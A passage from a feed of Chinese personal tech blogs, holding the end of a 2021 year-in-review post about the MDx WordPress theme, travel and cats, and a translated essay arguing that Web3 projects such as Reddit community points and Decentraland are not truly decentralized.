515px\"></a>\n<p>仍然是没有更新个人主页的一年，我也没有继续宣传这个页面，统计数据下滑大概是正常的。</p>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 4 次，新增 149 commits (<span>-54.57%</span>)，Star 数增加了 174，现有 788。</p>\n<p>终于，MDx 2.0 发布了。但是因为今年的过于忙碌，MDx 并没有得到足够的维护，版本发布周期也拉得比较长，很多 Bug 没能及时修复。希望明年可以把更多的时间花在维护 MDx 上。无论如何，还是感谢各位对于 MDx 的支持！</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>2021 大事记</h1>\n<p>说起来，2021 真的太多“第一次”了...</p>\n<ul>\n<li>一月：由于电脑电池鼓包，第一次用 iPad 外接屏幕远程桌面到服务器来考期末🌚太痛苦了</li>\n<li>一月：MDx 喜提 600 Stars</li>\n<li>三月：第一次测核酸（真的酸）</li>\n<li>三月：第一次坐上 A350！(B-309W）</li>\n<li>三月：第一次来到英国</li>\n<li>六月：第一次来到伦敦</li>\n<li>六月：第一次去猫咖撸猫🐱</li>\n<li>六月：第一次坐上 B777！(B-2025）</li>\n<li>七月：酒店隔离十四天🌚</li>\n<li>七月：MDx 喜提 700 Stars</li>\n<li>七月：第一次和猫一起住（时刻有猫撸真的爽😆）</li>\n<li>七月：入职<a href=\"https://75.team/\">奇舞团</a>实习</li>\n<li>八月：北京景点怎么这么多</li>\n<li>九月：北京景点怎么还有这么多</li>\n<li>九月：<a href=\"https://flyhigher.top/develop/2160.html\">谈谈 WebAuthn</a> 被 <a href=\"https://weibo.com/1893751011/KyipM3tOM\" rel=\"noopener noreferrer\">w3c中国微博转发</a><del>（虽然并没有人看）</del>\n</li>\n<li>九月：从奇舞团<del>跑路</del>\n</li>\n<li>九月：整了个 Stackoverflow 的复制粘贴键盘<del>，太好用了</del>\n</li>\n<li>十月：终于买了心心念念的 MSFS</li>\n<li>十一月：终于买了一台新相机</li>\n<li>十一月：第一次坐上 A380！(B-6140）</li>\n<li>十二月：第一次来到爱丁堡并和 <a href=\"https://diygod.me/\">@DIYgod</a> 面基</li>\n</ul>\n<section><div class=\"set-images-div\">\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats.jpg\" alt=\"和猫一起住的唯一问题就是手机很快会被猫片塞满\" width=\"730\" height=\"1500\" class=\"aligncenter size-full wp-image-2518\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats.jpg 730w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats-146x300.jpg 146w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats-498x1024.jpg 498w\" sizes=\"(max-width: 730px) 100vw, 730px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat.jpg\" alt=\"看到你在写前端，猫猫很担心你\" width=\"1004\" height=\"1500\" class=\"aligncenter size-full wp-image-2523\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat.jpg 1004w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat-201x300.jpg 201w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat-685x1024.jpg 685w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat-768x1147.jpg 768w\" sizes=\"(max-width: 1004px) 100vw, 1004px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv.jpg\" alt=\"高效开发工具（确信\" width=\"1500\" height=\"1019\" class=\"aligncenter size-full wp-image-2519\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv.jpg 1500w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv-300x204.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv-1024x696.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv-768x522.jpg 768w\" sizes=\"(max-width: 1500px) 100vw, 1500px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt.jpg\" alt=\"和 Ralph 在天坛\" width=\"947\" height=\"1500\" class=\"aligncenter size-full wp-image-2524\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt.jpg 947w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt-189x300.jpg 189w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt-646x1024.jpg 646w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt-768x1216.jpg 768w\" sizes=\"(max-width: 947px) 100vw, 947px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/380.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/380.jpg\" alt=\"380!\" width=\"1500\" height=\"874\" class=\"aligncenter size-full wp-image-2517\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/380.jpg 1500w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/380-300x175.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/380-1024x597.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/380-768x447.jpg 768w\" sizes=\"(max-width: 1500px) 100vw, 1500px\"></a>\n</div>\n<div class=\"set-images-div2\">\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2.jpg\" alt=\"到处玩.jpg\" width=\"1500\" height=\"1080\" class=\"aligncenter size-full wp-image-2521\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2.jpg 1500w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2-300x216.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2-1024x737.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2-768x553.jpg 768w\" sizes=\"(max-width: 1500px) 100vw, 1500px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play.jpg\" alt=\"还是到处玩.jpg\" width=\"977\" height=\"1500\" class=\"aligncenter size-full wp-image-2520\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play.jpg 977w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play-195x300.jpg 195w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play-667x1024.jpg 667w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play-768x1179.jpg 768w\" sizes=\"(max-width: 977px) 100vw, 977px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars.jpg\" alt=\"380 上的星空\" width=\"1002\" height=\"1500\" class=\"aligncenter size-full wp-image-2522\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars.jpg 1002w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars-200x300.jpg 200w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars-684x1024.jpg 684w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars-768x1150.jpg 768w\" sizes=\"(max-width: 1002px) 100vw, 1002px\"></a>\n</div>\n</section><p><span>点击图片查看描述</span></p>\n<p>对了，对于可爱的猫猫们，我整了一个 Telegram 贴纸包，你可以在这里获取：<a href=\"https://telegram.me/addstickers/huanAndDan\">https://telegram.me/addstickers/huanAndDan</a>。</p>\n<h1>跨年红包</h1>\n<p>今年的解题之旅，从下面这张图片开始：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/b.jpg\" alt=\"\" width=\"1510\" height=\"1250\" class=\"aligncenter size-full wp-image-2556\"></a>\n<p>不过，鉴于今年的题目较以往对于认真解题的人更难，我还准备了隐藏红包，在解题中收集线索即可发现隐藏红包。共有 20 个普通红包和 10 个隐藏红包。</p>\n<p>解题计划持续到东八区 2022.02.03 23:59:59 或红包被领完为止，之后我会发布题解。不过由于去年情况混乱，今年在解题过程中我一旦发现有不正常的现象就会立即停止活动。Anyway，新年快乐！祝玩得开心。</p>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报用到了 PS 和 Adobe 家的新玩具 Dimension。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1.jpg\" alt=\"\" width=\"707\" height=\"1000\" class=\"aligncenter size-full wp-image-2547\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1.jpg 1414w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-212x300.jpg 212w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-724x1024.jpg 724w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-768x1086.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-1086x1536.jpg 1086w\" sizes=\"(max-width: 707px) 100vw, 707px\"></a>\n<p>那么祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2507.html"},{"title":"[译] 不，Web3 不是去中心化","date":"2021-12-14 14:01:00","description":"\n<h2>来自译者的楔子</h2>\n<p>加密货币社区对元宇宙和 Web3 的狂热仍在继续，大量投资人和开发者前仆后继加入其中。但是，Web3 真的能实现支持者们的种种愿景吗？亦或是另一个镜中月、水中花？也许让历史照进现实，能给我们答案。<br>这是自 <a href=\"https://blog.skk.moe/post/keep-web-free-say-no-to-web3/\">Web3 系列的引子之后</a>，这个系列的第一篇文章。</p>\n<blockquote><p>原文标题：Web3 is not decentralization<br>原文链接：<a href=\"https://invisibleup.com/articles/38/\">https://invisibleup.com/articles/38/</a><br>原文作者：<a href=\"https://invisibleup.com/\">InvisibleUp</a><br>译者：<a href=\"https://skk.moe/\">Sukka</a>，首发于 <a href=\"https://blog.skk.moe/\">Sukka's Blog</a></p></blockquote>\n<p>不，真的。Web3 并不是去中心化。我觉得这应该很明显。我原本以为我不需要一整篇文章来阐述这个问题，但我想我确实需要。</p>\n<p>令我感到吃惊的是，像 Reddit、Twitter 和 Discord 这样的科技巨头突然决定全力投入到 NFT 中，以达到「去中心化」的目的，尤其是其中 Reddit 的做法令我尤为生气。在 <a href=\"https://www.coindesk.com/markets/2020/05/14/reddit-rolls-out-community-points-on-ethereum-to-incentivize-positive-behavior/\">2020 年 5 月</a>左右，他们在 <code>/r/FortniteBR</code> 和 <code>/r/CryptoCurrency</code> 中实验性的启动了一个「社区代币」系统，虽然我从未去过这两个 Subreddit，但我从一名 <a href=\"https://twitter.com/isyourguy/status/1457220590004158468\">来自 Reddit 的开发者的 Twitter 推文中</a> 得知，他们正在计划将 Reddit 的 Karma Point 转换为这些代币。</p>\n<blockquote><p>译者注：关于 Reddit 将 Karma 转变为 ERC-20 代币系统一事，我曾经在我的 Web3 系列文章与译文中引用过一篇 <a href=\"https://cointelegraph.com/news/reddit-to-reportedly-tokenize-karma-points-and-onboard-500m-new-users\">相关的新闻报道</a></p></blockquote>\n<p>在我列举的三家科技巨头中，Reddit 是走出最远的、愿景最具体的——Twitter 的为用户上传的图片添加 NFT 标签的计划依然停留在纸面上、而 Discord 在其用户的强烈反对下无限期暂停了他们的计划。因此，我在这里主要介绍 Reddit 目前已经公开的计划和路线图。简而言之，Web 1.0 是一个伟大的去中心化前沿阵地、Web 2.0 是一堆有墙的花园、有许多缺点。我完全赞同这个观点。然而，Reddit 正在加入其他公司的 Web3 的行列、准备通过分配基于以太坊的加密货币、赋予网站用户以投票权。</p>\n<p>我之后再分析这句话是什么意思，现在你只要对这句话有点印象就好了。</p>\n<h2>旧互联网上的去中心化</h2>\n<p>让我们复习一下互联网的历史，上个世纪 80 年代、互联网的起源时期。在那个年代，互联网分为两大阵营，来自 MIT、国防部和欧洲原子能研究中心（译者注：Web 之父 蒂姆·博纳斯·李 就是在欧洲原子能研究中心提出了关于互联网、HTTP 的构想）的 ARPANET，和民间的临时性的、自制的调制解调器。</p>\n<p>ARPANET（现代互联网的直接技术先驱）在设计时就明确考虑到了网络层面的冗余和路由的灵活性。如果苏联人的核武器摧毁了重要城市的战略数据中心，只要 A 与 B 两点之间仍然存在数据通路（如微波），那么电子信息就依然可以传输。这个设计也有缺点，文件分享与数据传输（译者注：指 FTP 和 Gopher。FTP 发明于 1971 年，而 HTTP 诞生于 1992 年，此时冷战已经结束、核战争的威胁已经不复存在）仍然需要服务器才能运行，这意味着如果加利福尼亚被外星人攻击了，你就无法访问来自斯坦福大学的文件。但是，诸如电子邮件、IRC、尤其是 Usenet 等协议的发展，确保了互联网上从服务器到服务器传输信息的能力、从而在整个网络上创造了一个单一的信息来源。</p>\n<p>抛开美国国防部的 ARPANET，有抱负的黑客和公司正在忙于创建公告板系统。一般的，他们会在自己的电脑上运行一个程序，其他的电脑可以通过调制解调器连接，在两台电脑之间实现了一个一对一的直接连接。但是，为了和不止一台电脑连接，你需要挂断一个电话、断开与前一台计算机的链接，然后拨打下一个号码。受限于调制解调器，只有最重要的信息会被下载，导致了孤岛的诞生，如同 Web3 支持者批判的 Web 2.0 孤岛一样。</p>\n<p>为了解决这个问题，人们设计了一些变通方法，其中一个例子就是 UUCP（译者注：BSD-based 的操作系统如 FreeBSD 和 macOS，依然保留了 UUCP 的二进制，你可以在终端中输入 <code>uucp</code> 试试），实现了从 Unix 服务器到 Unix 服务器的信息拷贝。通过登录到一个连接到一系列对等服务器的公共Unix服务器，你可以手动输入一个信息的路径，以到达一个特定的服务器或用户。早期版本的路径使用的地址类似于 <code>www-skk!sukka!moe</code>。自然而然的，随着互联网的发展，这种方法就被淘汰了。</p>\n<blockquote><p>译者注：关于 UUCP 和「一个信息的路径」的更多细节，你可以阅读我的博客上的另一篇译文 <a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>，这篇文章详细介绍了互联网和 URL 的变迁历史。</p></blockquote>\n<p>另一种方法是 FidoNet，在民间的 BBS 运营者中非常受欢迎。这是一个允许 BBS 与其他系统同步信息和数据的协议，能够将长途漫游电话费卸载到同一地区内的区间中。</p>\n<p>所有这些早期的交换协议使得互联网根本不存在中心。随着时间的推移，BBS 逐渐被 ISP 替代——ISP 允许你访问其他城市甚至国家的网络、将电子邮件发送到千里之外。其中一些 ISP 很快就发展成为了 ICP，如 AOL（美国在线）和雅虎的 GeoCites（前身为 贝弗利山互联网）。最终，围墙式花园的做法逐渐消失了，IETF 小组成立并开始制定关于互联网的公开规范标准，而 ISP 们则专注于维护和改进宽带基础设施（如建设数据中心、铺设跨洋光纤和骨干网）。</p>\n<h3>案例分析：Usenet</h3>\n<p>你可以把 Usenet 视为 Reddit 的前辈。因为它是一个拥有各种「不同新闻小组」的社区。虽然 Usenet 设计之初时的用途是在互联网上提供新闻，但是它很快被用于各种你能想到的话题。后来，Usenet 成为了传播盗版电影、软件和儿童色情的地下方法（是的，你依然可以通过类似 eternal september 这样的软件访问 Usenet）。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.6.2/usenet.png\" alt=\"usenet.png\" width=\"800\" height=\"600\"></p>\n<p>作为一个非常、非常简化的模型，你发送的信息会像电子邮件一样被发送到新闻组服务器，在那里它们会被发布给全世界的人看。你可以回复线程中的其他信息，或者直接向帖子的作者发送电子邮件。评论将以树状视图展开，与 Reddit 的评论系统非常相似。新闻组服务器可以选择托管某些新闻组，并定期与网络的其他部分同步，以保持所有内容的更新。Usenet 信息也可以与现有的 FidoNet 系统进行交换。在我看来，这在当时是一个设计得非常好的系统。</p>\n<p>不过，最大的问题是缺乏良好的管理控制。Usenet 上的大多数新闻组都是无节制的，这在 Spammer 和其他的什么人开始破坏空间的不成文规则之前、是完全没有问题的。由于 Usenet 固有的分散性质，追溯性地删除信息的工具是有限的。系统版主可以发送取消信息，这个过程可以由 <a href=\"https://en.wikipedia.org/wiki/Cancelbot\">取消机器人</a> 自动完成。这在当时被认为是有争议的，因为它被认为是侵犯了言论自由权。另一种方法是有节制的新闻组，即信息首先被送到新闻组管理员那里进行审批。</p>\n<p>由于大型二进制文件的泛滥，导致互联网服务供应商被迫拔线，再加上有太多的垃圾邮件无法正确应对，Usenet 基本上消亡了。作为回应，世界范围内高度规范的留言板和博客开始大量涌现，最终互联网巨头和大型网站诞生了，如 4chan、Reddit、Facebook 和 Twitter。</p>\n<h3>案例分析：IRC</h3>\n<p>IRC、即 Internet Relay Chat，是 20 世纪 80 年代末设计的一种即时通讯协议。最初，它被设计成每个用户都在同一个网络上，但不久之后，社区中的分裂导致了几个竞争性网络的产生，如 FreeNode（现在的 Libera Chat）、EFnet 和 IRCnet。较小的网络，如 tilde.chat 也存在。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.6.2/irc.png\" alt=\"irc.png\" width=\"800\" height=\"600\"></p>\n<p>IRC 也是一个分布式系统，在这个意义上，同一 IRC 网络中的多个服务器可以同步并主持相同的频道，并在服务器之间转发信息。你只需连接到离你最近的服务器，后端就会适当地转发信息。你几乎可以使用任何客户端来连接，因为与今天复杂的专有的协议相比，IRC 是一个简单而开放的协议。根据需要，附加机器人或「弹跳器」（机器人会保存信息供以后查看，因为 IRC 不支持查看历史信息）是很容易的，因为它们只不过是专门编程的客户端。</p>\n<p>IRC（通常）只能发送文本信息，没有很好的用户注册、信息回滚机制，也没有 MSN、Slack、Matrix 或 Discord 等较新的聊天应用程序的几乎任何其他功能。2003 年，随着更有说服力的替代品的出现，它开始衰退，但是它仍然被广泛用于开源技术社区和服务的后端。</p>\n<h3>案例分析：IPFS</h3>\n<p>IPFS（星际文件系统）是一个典型的现代分散协议的例子。它解决了文档和文件只有一个真实来源的问题，让任何人都可以托管一个文件的副本以提供网络冗余。</p>\n<p>IPFS 的工作方式有点笨拙，基本上是使用文件的哈希值作为其永久地址。有一些方法可以解决这个问题，比如 <a href=\"https://docs.ipfs.io/concepts/ipns/\">IPNS</a> 与 <a href=\"https://docs.ipfs.io/concepts/dnslink/\">DNSLink</a> 的结合，它给 DNS 条目提供了一个静态地址，可以引用位于 IPFS 上的任何文件。</p>\n<p>......这一节很短，因为没有太多的东西可以写。IPFS 主要负责文件。<a href=\"https://neocities.org/\">Neocities 有对它的支持</a>。然后是，与大部分人想象中的完全相反，绝大多数 NFT 艺术品其实都托管在 IPFS 上面。唯一真正的问题是，IPFS 上的文件并不是永久存在的。一个文件可能会在未来失踪，因为没有其余的主机没有这个文件的副本（如同 BitTorrent 无人做种一样），但这并不是一个真正可以现实地解决的问题。而它其实工作地相当好。</p>\n<h3>中场休息：言论自由和言论审查</h3>\n<p>让任何人能够主持任何事情的一个自然后果是——「他们可以主持任何事情」。你同意的东西，你不同意的东西，你认为绝对不道德的东西。我个人主张 「<a href=\"https://en.wikipedia.org/wiki/Paradox_of_tolerance\">宽容的悖论</a>」，主张伤害的声音应该被踢到路边。而令人惊讶的是，去中心化系统的人做到了这一点——如果一个网络上的某个特定群体相当有毒，社区可以简单地分叉，排除他们，并继续下去，有效地将不良行为者隔离在一个回声室中。Mastodon 的服务器屏蔽系统已经表明这是一个相当有效的解决方案，最近 FreeNode 的自我毁灭和与用户纷纷迁移到 Libera Chat 更是完美体现了这一点。</p>\n<p>当然，这也不是万无一失的。Parler 和 Kiwi Farms 是被排斥的社区的例子，它们仍然在做明显的伤害，比如延续导致 1 月 6 日袭击的阴谋论，或者<a href=\"https://en.wikipedia.org/wiki/Kiwi_Farms#Suicides_of_harassment_targets\">由于不断的骚扰而导致许多人自杀</a>。Kiwi Farms 勉强维持着与外部互联网的连接，因为他们的 DNS 和 DDoS 保护完全由 Cloudflare（唯一剩下的愿意与他们合作的公司）提供，他们的服务器托管全部由「1776 Solutions」内部完成，该 ISP 对外只能通过一条 Transit 连接。</p>\n<blockquote><p>译者注：在 Cloudflare 清退 8chan、Voxility 将向 8chan 敞开怀抱的 Epik, Inc. 和 BitMitigate 拔线后，8chan 最终也被托管到由 1776 Solutions（AS397702）提供的服务器。如果作为本文的读者你也是一名 ISP 从业者，我在这里倡议你在你的网络中为任何通往 AS397702 的路由设置黑洞。</p></blockquote>\n<p>归根结底，我们试图用技术解决社会文化问题，这几乎是不可能的。真正的解决方案是让人们不要成为可怕的偏执者，而我对如何实现这一点没有丝毫头绪。</p>\n<h2>Web3 的「去中心化」概念</h2>\n<p>在过去的 3600 字中，我已经花了太多的时间去研究 20-40 年前的协议。是时候让我们回到现代了。在新兴的加密货币领域，存在着「DAO」的概念，即去中心化的自治组织。<a href=\"https://ethereum.org/en/dao/\">Ethereum.org</a> 将其描述为「像一个互联网原生企业，由其成员集体拥有和管理」。从表面上看，这听起来很像共产主义、或是苏联的「农村合作社」运动。</p>\n<p>以太坊作为一种加密货币，主要存在于以太坊虚拟机上执行代码。这是一个非常奇怪的架构（基于堆栈，1024 深度，256 位比特），其状态在全球每个以太坊矿工之间共享，其输入和输出是代币，要么是可替代的（如以太坊货币），要么是不可替代的。</p>\n<p>通过智能合约在区块链上永久存储硬规则的组织，你可以在项目上花费任何货币之前强制要求投票。所说的投票（以及代码和资金和其他一切）将是完全透明的，而且组成 DAO 的智能合约将是不可改变的。</p>\n<p>虽然我可以讨论智能合约的优点，但是不可忽视的就是他们的陷阱。例如，最大的 DAO —— <a href=\"https://en.wikipedia.org/wiki/The_DAO_(organization)\">The DAO</a>，在上线伊始就因为代码 Bug 而被黑客攻击、所有的资金全部化为乌有，以太坊网络被迫硬分叉来保护投资者的合约。当然，相比继续讨论 DAO 的失败案例，我们还是讨论一下这些实践是如何运作的吧。</p>\n<h3>案例分析：Reddit 社区代币</h3>\n<p>让我们把这一切带回我们开始的地方：Web3 的趋势与互联网上的社交媒体巨头。正如我之前所说，Reddit 是最有兴趣加入 DAO 并开始称自己为 「去中心化」的网站，所以我们将从那里开始。</p>\n<p>这里要做的明显比较是，Reddit 是一个类似于 Usenet 的中心化网站。Reddit 承载着 Subreddit，并提供审核工具，既包括 Upvote / Downvote 的形式，也包括实际的版主形式。在 Reddit 上，严格禁止操纵 Upvote / Downvote 的行为，网站管理员使用自动化工具禁止任何人这样做。这为子版块的社区创造了一种决定哪些内容是最好的方式，并将这些优质内容推广到前面，无论他们是一个偶然的潜水者还是一个活跃的成员发表的。这是 Reddit 运作的基础，到目前为止，它运作得相当好。</p>\n<p>随着社区积分的引入，Reddit 声称他们允许会员「拥有他们喜欢的社区的一部分」，就像股东拥有他们喜欢的公司的一部分一样。积分是衡量声誉的一个标准，是用于投票或福利的货币，如徽章、表情符号、GIF 等，以炫耀你的财富。投票是不具约束力的公投，采用一人一票和每点一票的方式计算。在投票过程中，积分不会被消耗。每隔四周，Reddit 网站会公布每个用户的名单，他们获得了多少 Karma，以及他们将获得多少积分作为补偿。对这个名单的修改可以用积分投票的方法提出。</p>\n<p>这里应该很明显的一点是，这根本就不是去中心化。因为你甚至不能在 Reddit 的系统中投票选举新版主。当然，你也不能建立属于你自己的 Subreddit，并在那里建立一个社区；或者从 Reddit 主网络中分叉出来，创建一套新的独立子版块；或者规避 Reddit 网站管理员的意愿；或者逃避 Reddit 是一个需要盈利的企业的事实、而让用户购买假的互联网积分、并让用户产生自己拥有控制的错觉。</p>\n<h3>案例分析：Decentraland</h3>\n<p><img src=\"https://npm.elemecdn.com/sks@0.6.2/decentraland.jpg\" alt=\"decentraland.png\" width=\"1207\" height=\"682\"></p>\n<p>抛开 Reddit，现在让我们请出 <a href=\"https://decentraland.org/\">Decentraland</a>。这是一个用于创建虚拟世界的 DAO，这个概念如今也被称为「元宇宙」。</p>\n<p>Decentraland 允许用户对 Decentraland 生态系统内的各种政策和变量进行投票，例如增加新的可穿戴设备，对某些项目的拨款，市场费用，允许使用的基础设施等。还存在一个安全顾问委员会、有权力扔掉现有的合约、改用修复了漏洞的合约。<a href=\"https://governance.decentraland.org/\">你可以在这里查看这些提案的一些例子</a>。一个特别有趣的是这个拨款提案，<a href=\"https://governance.decentraland.org/proposal/?id=47e1bb80-4139-11ec-be0c-afec86cba5e5\">以增加对一个被称为 IPSME 的元宇宙协议的支持</a>，这是我想改天进一步调查的事情。</p>\n<p>Decentraland 从根本上说是在一个被称为 MANA 的可替换代币上运行的，它被用于所有系统内的交易。虽然投票是使用 <a href=\"https://docs.snapshot.org/\">Snapshot</a> 进行的，没有交易费用（Gas），<a href=\"https://docs.decentraland.org/decentraland/what-do-you-need-to-participate/\">但你的投票权是由你拥有的游戏中的货币数量加权的</a>。这（在理论上）<strong>使已建立的富裕用户比新建立的贫穷账户更重要</strong>，使用的系统非常类似于标准加密货币中的股权证明工作。</p>\n<p>虽然我不能证明 Decentraland 遵循了这一点，但 DAO 中一个常见的投票结构是「<a href=\"https://en.wikipedia.org/wiki/Quadratic_voting\">平方投票法</a>」。这是为了判断一个人的偏好程度，而不是单纯的二元 是 / 否。通过对每一票收取幂等的货币 / 代币 / 金钱 / 等等(例如：1 票 = 1 美元，2 票 = 4 美元，3 票 = 8 美元，等等）。<strong>如果每个被投票的人都有一个固定的、一致的点数来分配给投票，那么这个方法就相当好，但如果把它与货币联系起来，你就会产生大量的问题。</strong></p>\n<p>举例说明，穷人只有更少的货币来表达他们的偏好。虽然一个穷人为了实现他们的诉求，愿意牺牲自己所有的一切，但是他们很容易就被一个有着相反偏好的富人所推翻。请看，非洲贫困国家缺乏公共交通、缺乏无障碍辅助设备、缺乏药物、缺乏纯净的饮用水和健康的食品供应。当地人并不是不需要这些东西，只是因为在富人们眼中，这些穷人的生活不值得被改善。 在美国，许多非白人的贫困社区因为「城市更新」政策被迫拆除、土地被用于修建高速公路，就是一个典型的例子。</p>\n<p>还有一个问题是，整个系统的模式是通过人为的稀缺性来获利。在 Decentraland 上的一票、一块土地、一件衣服或什么的，<strong>只是一系列的比特和字节，完全可以被自由复制或扩展</strong>。我特别厌恶 NFT 的主要原因是我对人工稀缺性的概念的厌恶，这种东西在 NFT 发明之前就已经困扰着数字世界，强硬的知识产权法充其量只是将大量的流行文化束缚在地下粉丝艺术家手中。我们的经济体系认为，自然和人类的创造物不是给世界的礼物，要负责任地和可持续地使用，而是作为资源被开发到其极限。自然，开发自然资源和荒谬的能源需求，仅仅是为了加强互联网上的物品的价值，这将是最终的结局，因为对我们来说，唯一重要的事情似乎是我们是否能从我们得到的礼物中产生投资回报。</p>\n<p>值得注意的是，我并非反对艺术家，出版社，版权委托书。我认为艺术印刷品在 Ko-Fi、Pateron 上付费是对创作伟大内容的回报，而不是一种贪婪地攫取金钱、希望从中获利的手段。<strong>NFT 正是因为无视艺术是情感的表达、是付诸了爱的劳动的概念，倾向于大规模生产垃圾赚快钱</strong>，才被我鄙视的。</p>\n<p>很明显，Decentraland 没有规定杜绝这种理念，除非硬分叉源代码，不做 Decentraland。如果  DAO 不能从平台上的交易费中获得足够的投资回报来继续运营，Decentraland 服务器本身也完全有可能倒闭。当然，<strong>所有的投票将主要由那些已经从 Decentraland 的方式中获益最多的人决定，他们对公平的竞争环境兴趣不大，而更愿意投票给那些给他们带来更多财富的东西，创造一个非常不平等和不公平的虚拟社会</strong>。</p>\n<p>我的最终结论是，Decentraland 是一个非常有趣的平台，<strong>但它有固有的等级制度，来自早期主要参与者积累的财富。</strong>从本质上讲，它和 Reddit 一样是一个单一的网站，拥有最多的代币的人就如 Reddit 的管理员和版主一样、凌驾于其他普通用户之上。如果 Decentraland 不使用区块链、将数据完全存储在 Decentraland 中心化的服务器上，或使用 Steam 钱包余额而不是 ERC-20 作为代币，以及通过纸质合同和法务部来执行公司内部的拨款，<strong>那么这个中心化的系统和现有的在区块链上运行的系统本质上仍然是完全相同的</strong>。如果 Decentraland 的服务器瘫痪，Decentraland 上的任何东西都没有价值；在它的生态之外，Decentraland 的任何东西也没有任何价值。简单地说，我不能真诚地称其拥有丝毫的去中心化。</p>\n<div class=\"license\">\n<div>[译] 不，Web3 不是去中心化</div>\n<div><a href=\"https://blog.skk.moe/post/web3-is-not-decentralization/\">https://blog.skk.moe/post/web3-is-not-decentralization/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2021-12-14</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/web3-is-not-decentralization/"},{"title":"[译] 捍卫自由的互联网，对 Web3 说不","date":"2021-12-12 13:40:00","description":"\n<h2>来自译者的楔子</h2>\n<p>作为一个充满泡沫和噱头的新概念，Web3 和元宇宙在区块链的社区中掀起了一波浪潮。鼓吹者坚信 Web3 